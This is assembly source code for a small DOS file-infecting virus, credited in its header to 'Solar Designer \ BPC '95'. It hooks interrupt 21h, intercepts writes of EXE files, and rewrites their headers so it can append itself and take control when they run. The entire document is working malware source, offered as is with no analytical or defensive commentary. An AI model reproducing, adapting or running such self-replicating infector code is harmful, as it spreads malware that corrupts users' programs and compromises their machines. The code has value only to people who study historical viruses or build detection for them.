; 
; Solar140 ViRUS ... Coded by Solar Designer \ BPC '95 
; 

.radix 16 

.model large 
.stack 200 
 
.code
.286 

OriginalEntry: 
push es 
push 0 
retf

VirusStart:
VirusSize = VirusEnd-VirusStart
VirusSeg = IntHandler-VirusStart
VirusStartOfs = 4

cli 
push es 

push cs
pop  ds 

mov  al,VirusSeg 
mov  es,ax 
xor  di,di 

std
cmpsw
cld 
je   Installed

mov  cl,VirusSize+2 
rep  movsb
mov  ds,bx 
mov  bx,21*4-VirusSize 
xchg ax,[di+bx]
stosw
mov  ax,es 
xchg ax,[di+bx]
stosw 

Installed: 

pop  es
push es
pop  ds 

db   68 
OriginalOfs:
dw   offset OriginalEntry
retn 

IntHandler: 
push di 
mov  di,VirusSize 
pusha 
cmp  ah,40h
jne  LastHandler
mov  si,dx
cmp  word ptr [si],'ZM'
jne  LastHandler

mov  bp,cx 
shr  bp,9
inc  bp 
cmp  bp,word ptr [si+4] 
jne  LastHandler

mov  ax,cx
add  ax,di 
jc   LastHandler 
mov  bp,ax
shr  bp,9
and  ax,1FF 
jz   FullPage 
inc  bp 
FullPage:
mov  word ptr [si+2],ax
mov  word ptr [si+4],bp 

mov  word ptr [si],'MZ'
  
mov  ax,word ptr [si+8]
add  ax,word ptr [si+16] 
shl  ax,4
sub  cx,ax 
xchg word ptr [si+14],cx 
   
mov  word ptr cs:OriginalOfs-VirusStartOfs,cx

popa 
pushf
call dword ptr cs:[di] 
pusha
push ds 

mov  ah,40
push cs 
pop  ds
cwd 
mov  cx,di 

pushf
call dword ptr ds:[di] 

pop  ds 
popa
pop  di 
retf 2 
 
LastHandler:
popa
pop  di 
db   0EA 
LastHandlerPtr: 
 
VirusEnd: 
 
end VirusStart 
